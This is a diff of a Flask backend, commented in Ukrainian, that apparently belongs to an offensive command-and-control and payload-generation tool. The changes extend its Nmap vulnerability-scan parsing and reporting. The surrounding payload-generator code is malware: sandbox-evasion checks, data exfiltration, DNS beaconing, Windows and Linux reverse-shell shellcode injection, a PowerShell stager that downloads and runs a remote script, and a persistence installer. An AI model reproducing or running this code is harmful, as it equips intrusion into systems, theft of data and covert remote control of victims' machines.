@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.9.5
+# Syntax Flask Backend - Segment SFB-CORE-1.9.6
 # Призначення: Backend на Flask з розширеним Nmap (сканування скриптами вразливостей).
-# Оновлення v1.9.5:
-#   - Додано новий тип розвідки: 'port_scan_nmap_vuln_scripts'.
-#   - Оновлено функцію perform_nmap_scan_be для підтримки запуску Nmap з опцією --script vuln (або кастомними скриптами).
-#   - Оновлено ендпоінт /api/run_recon для обробки нового типу розвідки.
-#   - Оновлено VERSION_BACKEND до "1.9.5".
+# Оновлення v1.9.6:
+#   - Покращено parse_nmap_xml_output_for_services для вилучення деталей виводу скриптів Nmap.
+#   - Оновлено handle_run_recon для port_scan_nmap_vuln_scripts для генерації форматованого текстового звіту
+#     на основі розібраних даних скриптів, замість простого повернення XML.
+#   - Оновлено VERSION_BACKEND до "1.9.6".
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -25,7 +25,7 @@ import os
 import uuid
 import shutil
 
-VERSION_BACKEND = "1.9.5" # Оновлено версію
+VERSION_BACKEND = "1.9.6" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {}
@@ -195,7 +195,7 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
 }
 
 def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple[bool, dict, list[str]]:
-    # ... (Код валідації без змін від v1.9.1) ...
+    # ... (Код валідації без змін від v1.9.5) ...
     validated_params = {}
     errors = []
     for param_name, rules in schema.items():
@@ -462,7 +462,7 @@ def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
     return log, "\n".join(results_text_lines)
 
 def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], str]:
-    # ... (Код без змін від v1.9.4) ...
+    # ... (Код без змін) ...
     log = [f"[RECON_BE_INFO] Імітація OSINT пошуку субдоменів для домену: {target_domain}"]
     results_text_lines = [f"Результати OSINT пошуку Субдоменів для домену: {target_domain}"]
     cleaned_domain = re.sub(r"^(www|ftp|mail)\.", "", target_domain, flags=re.IGNORECASE)
@@ -474,17 +474,17 @@ def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], s
     ]
     found_subdomains_list = set()
     for sub_prefix in common_subdomains_prefixes:
-        if random.random() < 0.20: 
+        if random.random() < 0.20:
             found_subdomains_list.add(f"{sub_prefix}.{cleaned_domain}")
-    for _ in range(random.randint(0, 2)): 
+    for _ in range(random.randint(0, 2)):
         prefix_part1 = random.choice(["data", "svc", "internal", "ext", "prod", "dev-app", "user"])
         prefix_part2 = random.choice(["01", "02", "new", "sys", str(random.randint(1,3))])
         if random.random() < 0.5:
             found_subdomains_list.add(f"{prefix_part1}-{prefix_part2}.{cleaned_domain}")
         else:
             found_subdomains_list.add(f"{prefix_part1}{random.randint(1,9)}.{cleaned_domain}")
-    if not found_subdomains_list and cleaned_domain: 
-        found_subdomains_list.add(f"www.{cleaned_domain}") 
+    if not found_subdomains_list and cleaned_domain:
+        found_subdomains_list.add(f"www.{cleaned_domain}")
         found_subdomains_list.add(f"mail.{cleaned_domain}")
 
     if found_subdomains_list:
@@ -495,7 +495,7 @@ def simulate_osint_subdomain_search_be(target_domain: str) -> tuple[list[str], s
     return log, "\n".join(results_text_lines)
 
 def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]:
-    # ... (Код без змін) ...
+    # Функція оновлена для вилучення деталей скриптів
     parsed_services = []
     parsed_os_info = []
     try:
@@ -507,6 +507,8 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
         for host_node in root.findall('host'):
             address_node = host_node.find('address')
             host_ip = address_node.get('addr') if address_node is not None else "N/A"
+            
+            # Парсинг інформації про ОС
             os_node = host_node.find('os')
             if os_node is not None:
                 for osmatch_node in os_node.findall('osmatch'):
@@ -522,6 +524,8 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                         "family": os_family, "generation": os_gen, "cpes": os_cpes
                     })
                     log_messages.append(f"[NMAP_XML_PARSE_OS] Знайдено ОС: {os_name} (Точність: {accuracy}) для хоста {host_ip}")
+
+            # Парсинг інформації про порти та сервіси
             ports_node = host_node.find('ports')
             if ports_node is None:
                 continue
@@ -541,6 +545,38 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                     for cpe_node in service_node.findall('cpe'):
                         if cpe_node.text:
                             service_cpes.append(cpe_node.text)
+                
+                # Парсинг виводу скриптів для цього порту
+                scripts_output = []
+                for script_node in port_node.findall('script'):
+                    script_id = script_node.get('id', 'N/A')
+                    script_data = script_node.get('output', '')
+                    # Додатковий парсинг для структурованих елементів всередині <script>, якщо є
+                    # Наприклад, якщо скрипт vulners створює <elem key="CVE-ID">...</elem>
+                    structured_script_data = {}
+                    for elem_node in script_node.findall('elem'):
+                        key = elem_node.get('key')
+                        if key:
+                            structured_script_data[key] = elem_node.text
+                    # Таблиці з скриптів
+                    tables_data = []
+                    for table_node in script_node.findall('table'):
+                        table_dict = {}
+                        for elem_node in table_node.findall('elem'):
+                            key = elem_node.get('key')
+                            if key:
+                                table_dict[key] = elem_node.text
+                        if table_dict:
+                            tables_data.append(table_dict)
+                    
+                    scripts_output.append({
+                        "id": script_id, 
+                        "output": script_data,
+                        "structured_data": structured_script_data, # Додано
+                        "tables": tables_data # Додано
+                    })
+                    log_messages.append(f"[NMAP_XML_PARSE_SCRIPT] Знайдено скрипт '{script_id}' для порту {port_id} на {host_ip}.")
+
                 version_info_parts = [product_name, version_number, extrainfo]
                 version_info_full = " ".join(part for part in version_info_parts if part).strip()
                 if not version_info_full:
@@ -559,9 +595,56 @@ def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list)
                     "service_name": service_name, "product": product_name,
                     "version_number": version_number, "extrainfo": extrainfo,
                     "version_info_full": version_info_full, "cpes": service_cpes,
-                    "service_key_for_cve": service_key_for_cve.strip()
+                    "service_key_for_cve": service_key_for_cve.strip(),
+                    "scripts": scripts_output  # Додано вивід скриптів
                 })
-        log_messages.append(f"[NMAP_XML_PARSE_SUCCESS] Успішно розпарсено XML, знайдено {len(parsed_services)} відкритих сервісів та {len(parsed_os_info)} записів ОС.")
+        
+        # Парсинг скриптів на рівні хоста (не прив'язаних до порту)
+        for host_node in root.findall('host'):
+            host_ip = host_node.find('address').get('addr') if host_node.find('address') is not None else "N/A"
+            hostscript_node = host_node.find('hostscript')
+            if hostscript_node:
+                host_scripts_output = []
+                for script_node in hostscript_node.findall('script'):
+                    script_id = script_node.get('id', 'N/A')
+                    script_data = script_node.get('output', '')
+                    structured_script_data = {}
+                    for elem_node in script_node.findall('elem'):
+                        key = elem_node.get('key')
+                        if key: structured_script_data[key] = elem_node.text
+                    tables_data = []
+                    for table_node in script_node.findall('table'):
+                        table_dict = {}
+                        for elem_node in table_node.findall('elem'):
+                            key = elem_node.get('key')
+                            if key: table_dict[key] = elem_node.text
+                        if table_dict: tables_data.append(table_dict)
+                    
+                    host_scripts_output.append({
+                        "id": script_id, 
+                        "output": script_data,
+                        "structured_data": structured_script_data,
+                        "tables": tables_data
+                    })
+                    log_messages.append(f"[NMAP_XML_PARSE_HOSTSCRIPT] Знайдено хост-скрипт '{script_id}' для {host_ip}.")
+                
+                # Додаємо хост-скрипти до інформації про ОС або як окремий запис
+                # Для простоти, можна додати до першого запису ОС для цього хоста, або створити новий запис
+                # якщо інформації про ОС немає
+                os_info_entry = next((os_info for os_info in parsed_os_info if os_info["host_ip"] == host_ip), None)
+                if os_info_entry:
+                    if "host_scripts" not in os_info_entry:
+                        os_info_entry["host_scripts"] = []
+                    os_info_entry["host_scripts"].extend(host_scripts_output)
+                elif host_scripts_output: # Якщо ОС не знайдено, але є хост-скрипти
+                    parsed_os_info.append({
+                        "host_ip": host_ip, "name": "N/A (Host Scripts Only)", "accuracy": "N/A",
+                        "family": "", "generation": "", "cpes": [],
+                        "host_scripts": host_scripts_output
+                    })
+
+
+        log_messages.append(f"[NMAP_XML_PARSE_SUCCESS] Успішно розпарсено XML, знайдено {len(parsed_services)} відкритих сервісів та {len(parsed_os_info)} записів ОС/хост-скриптів.")
     except ET.ParseError as e_parse:
         log_messages.append(f"[NMAP_XML_PARSE_ERROR] Помилка парсингу XML: {e_parse}")
     except Exception as e_generic:
@@ -614,7 +697,7 @@ def conceptual_cve_lookup_be(services_info: list, log_messages: list) -> list[di
     return found_cves
 
 def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool = False, recon_type_hint: str = None) -> tuple[list[str], str, list[dict], list[dict]]:
-    # Додано recon_type_hint для можливості встановлення дефолтних опцій для vuln_scripts
+    # ... (Код без змін від v1.9.5, але parse_nmap_xml_output_for_services тепер витягує скрипти) ...
     log = [f"[RECON_NMAP_BE_INFO] Запуск nmap для: {target}, опції: {options}, XML: {use_xml_output}, Тип: {recon_type_hint}"]
     base_command = ["nmap"]
     effective_options = list(options) if options else []
@@ -628,15 +711,16 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
         if not any("-O" in opt for opt in effective_options) and not any("-A" in opt for opt in effective_options):
              effective_options.append("-O")
     
-    # Встановлення дефолтних опцій для нового типу сканування, якщо кастомні не надано
-    if recon_type_hint == "port_scan_nmap_vuln_scripts" and not options: # options тут це кастомні опції від користувача
-        effective_options.extend(["-sV", "--script", "vuln", "-Pn"]) # -Pn для уникнення пропуску хостів
+    if recon_type_hint == "port_scan_nmap_vuln_scripts" and not options:
+        effective_options.extend(["-sV", "--script", "vuln", "-Pn"]) 
         log.append("[RECON_NMAP_BE_INFO] Використання дефолтних опцій для vuln_scripts: -sV --script vuln -Pn")
-    elif not effective_options: # Дефолтні для інших Nmap сканів, якщо опції не надано
+        if not any("-oX" in opt for opt in effective_options): # Переконуємося, що XML є для vuln_scripts
+            effective_options.extend(["-oX", "-"])
+    elif not effective_options: 
         effective_options = ["-sV", "-T4", "-Pn"] if not use_xml_output else ["-sV", "-O", "-T4", "-Pn", "-oX", "-"]
 
 
-    allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"] # Додано --script-args
+    allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"]
     final_command_parts = [base_command[0]]
     seen_options_main = set()
     has_A_option = any("-A" in opt for opt in effective_options)
@@ -649,19 +733,17 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
         opt = effective_options[i]
         main_opt_part = opt.split(' ')[0]
         is_allowed = any(opt.startswith(p) for p in allowed_options_prefixes)
-        is_arg_like = opt.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt) or "=" in opt or "," in opt # Дозволяємо коми для --script-args
+        is_arg_like = opt.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt) or "=" in opt or "," in opt 
 
         if is_allowed:
-            if main_opt_part not in seen_options_main or main_opt_part in ["--script", "--script-args"]: # Дозволяємо кілька --script або --script-args
+            if main_opt_part not in seen_options_main or main_opt_part in ["--script", "--script-args"]: 
                 temp_opts_for_cmd.append(opt)
-                if main_opt_part not in ["--script", "--script-args"]: # Не додавати до seen, якщо це скрипт/аргумент
+                if main_opt_part not in ["--script", "--script-args"]: 
                     seen_options_main.add(main_opt_part)
                 
-                # Обробка аргументів для опцій
                 if main_opt_part in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"] and (i + 1) < len(effective_options):
-                    # Переконуємося, що наступний елемент не є іншою опцією (крім випадку, коли це значення для --script або --script-args)
                     is_next_another_option = any(effective_options[i+1].startswith(p) for p in allowed_options_prefixes)
-                    if not is_next_another_option or effective_options[i+1].startswith("vuln") or "=" in effective_options[i+1]: # Дозволяємо аргументи типу "vuln" або "http-title.nse"
+                    if not is_next_another_option or effective_options[i+1].startswith("vuln") or "=" in effective_options[i+1] or "," in effective_options[i+1]: # Дозволяємо аргументи типу "vuln", "http-title.nse" або "arg1=val1,arg2=val2"
                         temp_opts_for_cmd.append(effective_options[i+1])
                         i += 1
             elif main_opt_part == "-oX" and opt == "-oX" and (i + 1) < len(effective_options) and effective_options[i+1] == "-":
@@ -683,36 +765,41 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
     log.append(f"[RECON_NMAP_BE_CMD_FINAL] Команда nmap: {' '.join(final_command_parts)}")
     parsed_services_list = []
     parsed_os_list = []
-    raw_output_text = ""
+    raw_output_text = "" # Це буде XML або текстовий вивід
     try:
-        process = subprocess.run(final_command_parts, capture_output=True, text=True, timeout=600, check=False) # Таймаут збільшено до 10 хвилин
-        raw_output_text = process.stdout if process.returncode == 0 else process.stderr
+        process = subprocess.run(final_command_parts, capture_output=True, text=True, timeout=600, check=False)
+        raw_output_text = process.stdout if process.returncode == 0 else process.stderr # Зберігаємо XML тут
         if process.returncode == 0:
             log.append("[RECON_NMAP_BE_SUCCESS] Nmap сканування успішно завершено.")
-            if use_xml_output: # Для CVE та Vuln Scripts потрібен XML для детального парсингу
+            # Для всіх типів, що використовують XML, парсимо його
+            if any("-oX" in opt and "-" in final_command_parts[final_command_parts.index(opt)+1:] for opt in final_command_parts if opt == "-oX"): # Перевіряємо, чи був запит на XML вивід у stdout
                 parsed_services_list, parsed_os_list = parse_nmap_xml_output_for_services(raw_output_text, log)
-                log.append(f"[RECON_NMAP_BE_PARSE_XML] Знайдено {len(parsed_services_list)} сервісів та {len(parsed_os_list)} записів ОС з XML.")
-                results_text_for_display = raw_output_text # Повертаємо сирий XML для відображення, якщо потрібен детальний аналіз
-            else: # Для стандартного сканування повертаємо текстовий вивід
-                results_text_for_display = f"Результати Nmap сканування для: {target}\n\n{raw_output_text}"
+                log.append(f"[RECON_NMAP_BE_PARSE_XML] Знайдено {len(parsed_services_list)} сервісів та {len(parsed_os_list)} записів ОС/хост-скриптів з XML.")
+                # results_text_for_display буде встановлено пізніше в handle_run_recon
+            else: # Якщо XML не запитувався, raw_output_text - це звичайний текстовий вивід
+                pass # results_text_for_display буде встановлено в handle_run_recon
         else:
             error_message = f"Помилка виконання Nmap (код: {process.returncode}): {raw_output_text}"
             log.append(f"[RECON_NMAP_BE_ERROR] {error_message}")
-            results_text_for_display = f"Помилка Nmap сканування для {target}:\n{error_message}"
+            # results_text_for_display буде встановлено в handle_run_recon
             if "Host seems down" in raw_output_text:
-                 results_text_for_display += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn."
+                 raw_output_text += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn."
             elif " consentement explicite" in raw_output_text or "explicit permission" in raw_output_text :
-                 results_text_for_display += "\nПОПЕРЕДЖЕННЯ NMAP: Сканування мереж без явного дозволу є незаконним у багатьох країнах."
+                 raw_output_text += "\nПОПЕРЕДЖЕННЯ NMAP: Сканування мереж без явного дозволу є незаконним у багатьох країнах."
     except FileNotFoundError:
         log.append("[RECON_NMAP_BE_ERROR] Команду nmap не знайдено.")
-        results_text_for_display = "Помилка: nmap не встановлено або не знайдено в системному PATH."
+        raw_output_text = "Помилка: nmap не встановлено або не знайдено в системному PATH."
     except subprocess.TimeoutExpired:
         log.append("[RECON_NMAP_BE_ERROR] Час очікування nmap сканування вичерпано.")
-        results_text_for_display = f"Помилка: Час очікування сканування nmap для {target} вичерпано."
+        raw_output_text = f"Помилка: Час очікування сканування nmap для {target} вичерпано."
     except Exception as e:
         log.append(f"[RECON_NMAP_BE_FATAL] Непередбачена помилка: {str(e)}")
-        results_text_for_display = f"Непередбачена помилка під час nmap сканування: {str(e)}"
-    return log, results_text_for_display, parsed_services_list, parsed_os_list
+        raw_output_text = f"Непередбачена помилка під час nmap сканування: {str(e)}"
+    
+    # raw_output_text тепер містить XML або текстовий вивід (або помилку)
+    # parsed_services_list та parsed_os_list містять розібрані дані, якщо XML був успішно оброблений
+    return log, raw_output_text, parsed_services_list, parsed_os_list
+
 
 def generate_simulated_operational_logs_be() -> list[dict]:
     # ... (Код без змін) ...
@@ -760,8 +847,7 @@ initialize_simulated_implants_be()
 
 @app.route('/api/generate_payload', methods=['POST'])
 def handle_generate_payload():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
+    # ... (Код без змін від v1.9.5) ...
     log_messages = [f"[BACKEND v{VERSION_BACKEND}] Запит /api/generate_payload о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         data = request.get_json()
@@ -865,7 +951,7 @@ def handle_generate_payload():
             "    return \"\".join(o_chars)",
             "",
             f"def {evasion_func_name_runtime}():",
-            # ... (код ec_runtime з v1.9.2, включаючи перевірку розміру диска) ...
+            # ... (код ec_runtime з v1.9.5) ...
             "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
             "    indicators = []",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
@@ -997,7 +1083,7 @@ def handle_generate_payload():
             "    return False",
             "",
             f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
-            # ... (код execute_func_name_runtime з v1.9.3, включаючи обробку 'upload_file_b64') ...
+            # ... (код execute_func_name_runtime з v1.9.5) ...
             "    try:",
             "        payload_params = json_stager_module.loads(payload_params_json)",
             "    except Exception as e_json_parse:",
@@ -1154,7 +1240,7 @@ def handle_generate_payload():
             "            elif exfil_state['active']:",
             "                 time.sleep(random.uniform(0.1, 0.5))",
             "    elif arch_type == 'dns_beacon_c2_concept':",
-            # ... (код dns_beacon_c2_concept з v1.9.3) ...
+            # ... (код dns_beacon_c2_concept з v1.9.5) ...
             "        c2_zone = payload_params.get('dns_zone')",
             "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
             "        implant_id_dns = STAGER_IMPLANT_ID",
@@ -1219,7 +1305,7 @@ def handle_generate_payload():
             "            print(f\"[PAYLOAD_DNS_BEACON] Очікування {{beacon_interval}} секунд до наступного DNS маячка...\")",
             "            time.sleep(beacon_interval)",
             "    elif arch_type == 'demo_file_lister_payload':",
-            # ... (код demo_file_lister_payload з v1.9.3) ...
+            # ... (код demo_file_lister_payload з v1.9.5) ...
             "        try:",
             "            target_dir = payload_params.get('directory', '.')",
             "            target_dir = target_dir if target_dir and target_dir.strip() != '.' else os.getcwd()",
@@ -1228,10 +1314,10 @@ def handle_generate_payload():
             "        except Exception as e_list:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка переліку директорії '{{payload_params.get('directory')}}': {{e_list}}\")",
             "    elif arch_type == 'demo_echo_payload':",
-            # ... (код demo_echo_payload з v1.9.3) ...
+            # ... (код demo_echo_payload з v1.9.5) ...
             "        print(f\"[PAYLOAD ({{arch_type}})] Відлуння: {{payload_params.get('message')}}\")",
             "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
-            # ... (код reverse_shell_tcp_shellcode_windows_x64 з v1.9.3) ...
+            # ... (код reverse_shell_tcp_shellcode_windows_x64 з v1.9.5) ...
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
             "        try:",
             "            shellcode_hex = payload_params.get('shellcode')",
@@ -1264,7 +1350,7 @@ def handle_generate_payload():
             "        except Exception as e_shellcode_win:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Windows: {{e_shellcode_win}}\")",
             "    elif arch_type == 'reverse_shell_tcp_shellcode_linux_x64':",
-            # ... (код reverse_shell_tcp_shellcode_linux_x64 з v1.9.3) ...
+            # ... (код reverse_shell_tcp_shellcode_linux_x64 з v1.9.5) ...
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Linux x64...\")",
             "        try:",
             "            shellcode_hex = payload_params.get('shellcode')",
@@ -1299,7 +1385,7 @@ def handle_generate_payload():
             "        except Exception as e_shellcode_linux:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Linux: {{e_shellcode_linux}}\")",
             "    elif arch_type == 'powershell_downloader_stager':",
-            # ... (код powershell_downloader_stager з v1.9.3) ...
+            # ... (код powershell_downloader_stager з v1.9.5) ...
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба завантаження та виконання PowerShell скрипта з URL: {{payload_params.get('ps_url')}}\")",
             "        try:",
             "            ps_command_to_run = f\"IEX (New-Object Net.WebClient).DownloadString('{payload_params.get('ps_url')}')\"",
@@ -1316,7 +1402,7 @@ def handle_generate_payload():
             "        except Exception as e_ps_download:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час завантаження/виконання PowerShell: {{e_ps_download}}\")",
             "    elif arch_type == 'windows_simple_persistence_stager':",
-            # ... (код windows_simple_persistence_stager з v1.9.3) ...
+            # ... (код windows_simple_persistence_stager з v1.9.5) ...
             "        method = payload_params.get('persistence_method')",
             "        command = payload_params.get('command_to_persist')",
             "        name = payload_params.get('artifact_name')",
@@ -1482,44 +1568,111 @@ def handle_run_recon():
         elif recon_type == "osint_subdomain_search_concept":
             recon_log_additions, recon_results_text = simulate_osint_subdomain_search_be(target)
         elif recon_type == "port_scan_nmap_standard":
-            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else [] # Використовуємо передані або дефолтні в perform_nmap_scan_be
-            recon_log_additions, recon_results_text, _, _ = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=False, recon_type_hint=recon_type)
-        elif recon_type == "port_scan_nmap_cve_basic":
             nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else []
+            # Для стандартного сканування use_xml_output=False, щоб отримати текстовий вивід
+            recon_log_additions, raw_nmap_output, _, _ = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=False, recon_type_hint=recon_type)
+            recon_results_text = f"Результати Nmap сканування для: {target}\n\n{raw_nmap_output}"
+        
+        elif recon_type == "port_scan_nmap_cve_basic" or recon_type == "port_scan_nmap_vuln_scripts":
+            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else []
+            # Для CVE та Vuln Scripts завжди потрібен XML для детального парсингу
             recon_log_additions_nmap, nmap_xml_data, parsed_services_nmap, parsed_os_nmap = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=True, recon_type_hint=recon_type)
             recon_log_additions.extend(recon_log_additions_nmap)
-            # ... (код парсингу XML та CVE, як у v1.9.4) ...
-            recon_results_text = f"Nmap Raw XML Output for {target}:\n\n{nmap_xml_data}\n\n"
-            recon_results_text += "--- Parsed OS Information ---\n"
-            if parsed_os_nmap:
-                for os_entry in parsed_os_nmap:
-                    recon_results_text += f"Host: {os_entry.get('host_ip', 'N/A')}\n  OS Name: {os_entry.get('name', 'N/A')} (Accuracy: {os_entry.get('accuracy', 'N/A')}%)\n"
-                    if os_entry.get('family'): recon_results_text += f"  Family: {os_entry['family']}\n"
-                    if os_entry.get('generation'): recon_results_text += f"  Generation: {os_entry['generation']}\n"
-                    if os_entry.get('cpes'): recon_results_text += f"  CPEs: {', '.join(os_entry['cpes'])}\n"
-                    recon_results_text += "\n"
-            else: recon_results_text += "OS information not found or could not be parsed.\n\n"
-            recon_results_text += "--- Parsed Services & Conceptual CVE Lookup ---\n"
-            if parsed_services_nmap:
-                cve_log_additions_local = []
-                cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local)
-                recon_log_additions.extend(cve_log_additions_local)
-                for service in parsed_services_nmap:
-                    recon_results_text += f"Port: {service.get('port')}/{service.get('protocol')}\n  Service: {service.get('service_name')}\n  Product: {service.get('product','')}\n  Version: {service.get('version_number','')}\n"
-                    if service.get('extrainfo'): recon_results_text += f"  ExtraInfo: {service.get('extrainfo')}\n"
-                    if service.get('cpes'): recon_results_text += f"  Service CPEs: {', '.join(service.get('cpes'))}\n"
-                    service_cves_found = [cve for cve in cve_results_local if cve.get('port') == service.get('port')]
-                    if service_cves_found:
-                        for cve in service_cves_found: recon_results_text += f"    CVE ID: {cve['cve_id']} (Severity: {cve['severity']})\n      Summary: {cve['summary']}\n"
-                    else: recon_results_text += "    No conceptual CVEs found for this service in the local DB.\n"
-                    recon_results_text += "\n"
-            else: recon_results_text += "Services for CVE analysis not found or nmap scan failed before service parsing.\n"
-        elif recon_type == "port_scan_nmap_vuln_scripts": # Новий тип сканування
-            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else [] # Дозволяємо кастомні опції
-            # Для vuln_scripts завжди хочемо XML для потенційного парсингу результатів скриптів
-            recon_log_additions, recon_results_text, _, _ = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=True, recon_type_hint=recon_type)
-            # Наразі просто повертаємо сирий вивід (XML або текст, якщо Nmap не зміг видати XML)
-            # У майбутньому можна додати парсинг специфічних результатів скриптів з XML
+
+            # Генерація форматованого звіту
+            report_lines = [f"Nmap Scan Report for: {target} (Type: {recon_type})"]
+            report_lines.append("="*40)
+
+            if "Помилка" in nmap_xml_data or "nmap не знайдено" in nmap_xml_data or "вичерпано" in nmap_xml_data : # Якщо nmap повернув помилку
+                report_lines.append("\nNmap Execution Issues:")
+                report_lines.append(nmap_xml_data) # Показуємо текст помилки
+            else:
+                # Інформація про ОС та Хост-скрипти
+                report_lines.append("\n--- Host Information & OS Detection ---")
+                if parsed_os_nmap:
+                    for os_entry in parsed_os_nmap:
+                        report_lines.append(f"Host: {os_entry.get('host_ip', 'N/A')}")
+                        if os_entry.get('name') != "N/A (Host Scripts Only)": # Не показувати, якщо це фіктивний запис для хост-скриптів
+                            report_lines.append(f"  OS Name: {os_entry.get('name', 'N/A')} (Accuracy: {os_entry.get('accuracy', 'N/A')}%")
+                            if os_entry.get('family'): report_lines.append(f"  Family: {os_entry['family']}")
+                            if os_entry.get('generation'): report_lines.append(f"  Generation: {os_entry['generation']}")
+                            if os_entry.get('cpes'): report_lines.append(f"  OS CPEs: {', '.join(os_entry['cpes'])}")
+                        
+                        if os_entry.get("host_scripts"):
+                            report_lines.append("  Host Scripts:")
+                            for script_info in os_entry["host_scripts"]:
+                                report_lines.append(f"    Script ID: {script_info['id']}")
+                                if script_info['output']: report_lines.append(f"      Output: {script_info['output'].strip()}")
+                                if script_info['structured_data']:
+                                    for k, v in script_info['structured_data'].items():
+                                        report_lines.append(f"      {k}: {v}")
+                                if script_info['tables']:
+                                    for table_idx, table_item in enumerate(script_info['tables']):
+                                        report_lines.append(f"      Table {table_idx+1}:")
+                                        for k, v in table_item.items():
+                                            report_lines.append(f"        {k}: {v}")
+                        report_lines.append("") # Порожній рядок між хостами/ОС
+                else:
+                    report_lines.append("OS information or host scripts not found or could not be parsed.")
+                report_lines.append("")
+
+                # Інформація про сервіси, CVE та скрипти портів
+                report_lines.append("--- Open Ports, Services, Scripts & CVEs ---")
+                if parsed_services_nmap:
+                    cve_log_additions_local = []
+                    cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local)
+                    recon_log_additions.extend(cve_log_additions_local)
+                    
+                    for service in parsed_services_nmap:
+                        report_lines.append(f"Port: {service.get('port')}/{service.get('protocol')} on {service.get('host_ip', target)}")
+                        report_lines.append(f"  Service: {service.get('service_name')}")
+                        if service.get('product'): report_lines.append(f"  Product: {service.get('product','')}")
+                        if service.get('version_number'): report_lines.append(f"  Version: {service.get('version_number','')}")
+                        if service.get('extrainfo'): report_lines.append(f"  ExtraInfo: {service.get('extrainfo')}")
+                        if service.get('cpes'): report_lines.append(f"  Service CPEs: {', '.join(service.get('cpes'))}")
+                        
+                        # Концептуальні CVE
+                        service_cves_found = [cve for cve in cve_results_local if cve.get('port') == service.get('port') and cve.get('host_ip', service.get('host_ip')) == service.get('host_ip')] # Додано перевірку host_ip
+                        if service_cves_found:
+                            report_lines.append("  Conceptual CVEs (Local DB):")
+                            for cve in service_cves_found:
+                                report_lines.append(f"    - {cve['cve_id']} (Severity: {cve['severity']})")
+                                report_lines.append(f"      Summary: {cve['summary']}")
+                        
+                        # Вивід скриптів для порту
+                        if service.get("scripts"):
+                            report_lines.append("  Port Scripts Output:")
+                            for script_info in service["scripts"]:
+                                report_lines.append(f"    Script ID: {script_info['id']}")
+                                if script_info['output']:
+                                    # Спроба витягти CVE з виводу скрипту vulners
+                                    if script_info['id'] == 'vulners':
+                                        vulners_output_lines = script_info['output'].strip().split('\n')
+                                        report_lines.append("      Vulners Scan Details:")
+                                        for line in vulners_output_lines:
+                                            line_stripped = line.strip()
+                                            if line_stripped: # Не додавати порожні рядки
+                                                report_lines.append(f"        {line_stripped}")
+                                    else:
+                                         report_lines.append(f"      Raw Output: {script_info['output'].strip()}")
+                                if script_info['structured_data']:
+                                    report_lines.append("      Structured Data:")
+                                    for k, v in script_info['structured_data'].items():
+                                        report_lines.append(f"        {k}: {v}")
+                                if script_info['tables']:
+                                    for table_idx, table_item in enumerate(script_info['tables']):
+                                        report_lines.append(f"      Table {table_idx+1}:")
+                                        for k, v in table_item.items():
+                                            report_lines.append(f"          {k}: {v}")
+                        report_lines.append("") # Порожній рядок між сервісами
+                else:
+                    report_lines.append("Services for analysis not found or Nmap scan failed before service parsing.")
+                
+                if recon_type == "port_scan_nmap_vuln_scripts":
+                     report_lines.append("\n--- Raw Nmap XML Output (for detailed analysis) ---")
+                     report_lines.append(nmap_xml_data if nmap_xml_data.strip() else "Nmap did not produce XML output or it was empty.")
